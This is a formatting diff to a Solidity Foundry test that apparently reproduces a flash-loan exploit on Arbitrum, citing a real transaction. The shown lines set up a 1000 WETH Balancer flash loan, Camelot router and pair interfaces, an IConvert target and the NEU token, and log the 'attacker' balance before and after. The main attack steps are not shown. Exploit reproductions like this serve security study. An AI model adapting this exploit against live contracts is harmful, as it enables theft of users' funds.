@@ -10,15 +10,18 @@ import "./../interface.sol";
 // https://explorer.phalcon.xyz/tx/arbitrum/0x6301d4c9f7ac1c96a65e83be6ea2fff5000f0b1939ad24955e40890bd9fe6122
 
 interface IVault {
+
     function flashLoan(
         IFlashLoanRecipient recipient,
         IERC20[] memory tokens,
         uint256[] memory amounts,
         bytes memory userData
     ) external;
+
 }
 
 interface IUniswapV2Router01 {
+
     function factory() external pure returns (address);
 
     function WETH() external pure returns (address);
@@ -90,9 +93,11 @@ interface IUniswapV2Router01 {
     ) external returns (uint256 amountToken, uint256 amountETH);
 
     function quote(uint256 amountA, uint256 reserveA, uint256 reserveB) external pure returns (uint256 amountB);
+
 }
 
 interface ICamelotRouter is IUniswapV2Router01 {
+
     function removeLiquidityETHSupportingFeeOnTransferTokens(
         address token,
         uint256 liquidity,
@@ -140,9 +145,11 @@ interface ICamelotRouter is IUniswapV2Router01 {
         address referrer,
         uint256 deadline
     ) external;
+
 }
 
 interface ICamelotFactory {
+
     event PairCreated(address indexed token0, address indexed token1, address pair, uint256);
 
     function owner() external view returns (address);
@@ -168,9 +175,11 @@ interface ICamelotFactory {
     function setFeeTo(address) external;
 
     function feeInfo() external view returns (uint256 _ownerFeeShare, address _feeTo);
+
 }
 
 interface ICamelotPair {
+
     event Approval(address indexed owner, address indexed spender, uint256 value);
     event Transfer(address indexed from, address indexed to, uint256 value);
 
@@ -252,13 +261,17 @@ interface ICamelotPair {
     function sync() external;
 
     function initialize(address, address) external;
+
 }
 
 interface IConvert {
+
     function convert(uint256 _amount) external;
+
 }
 
 contract CounterTest is Test {
+
     IVault valut = IVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
     IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
     IERC20 NEU = IERC20(0xdA51015b73cE11F77A115Bb1b8a7049e02dDEcf0);
@@ -277,7 +290,7 @@ contract CounterTest is Test {
     function test() public {
         console.log("Attacker's WETH token balance: ", WETH.balanceOf(address(this)));
         IERC20[] memory tokens = new IERC20[](1);
-        uint256[] memory amount = new uint[](1);
+        uint256[] memory amount = new uint256[](1);
         tokens[0] = WETH;
         amount[0] = 1000 ether;
         bytes memory userdata;
@@ -391,4 +404,5 @@ contract CounterTest is Test {
         wethAmount = WETH.balanceOf(address(this));
         console.log("Attacker's WETH token balance: ", wethAmount);
     }
+
 }
